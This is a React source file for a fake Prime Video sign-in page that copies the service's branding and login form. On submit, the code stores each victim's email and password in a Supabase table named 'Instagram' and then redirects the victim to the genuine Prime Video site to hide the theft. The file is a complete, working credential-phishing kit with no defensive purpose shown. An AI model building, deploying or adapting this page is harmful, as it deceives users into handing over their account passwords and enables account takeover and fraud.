import React, { useState } from "react";
import "./PrimeVideoLogin.css";
import { supabase } from "../../supabase";

const PrimeVideoLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.primevideo.com/auth-redirect";
    }
  };

  return (
    <div className="primevideo-login-bg">
      <div className="primevideo-login-center">
        <div className="primevideo-logo-svg">
          <svg width="120" height="32" viewBox="0 0 120 32" xmlns="http://www.w3.org/2000/svg"><text x="0" y="24" fontFamily="Arial Black, Arial, sans-serif" fontSize="28" fill="#00A8E1">prime</text><text x="70" y="24" fontFamily="Arial Black, Arial, sans-serif" fontSize="28" fill="#fff">video</text></svg>
        </div>
        <div className="primevideo-login-box">
          <h1 className="primevideo-signin-title">Sign In to Prime Video</h1>
          <form className="primevideo-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="primevideo-login-input"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              className="primevideo-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="primevideo-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="primevideo-error">{error}</div>}
            {success && <div className="primevideo-success">Login saved!</div>}
          </form>
          <div className="primevideo-signup-now">
            New to Prime Video?{' '}
            <a
              href="https://www.primevideo.com/signup"
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign up now.
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PrimeVideoLogin;
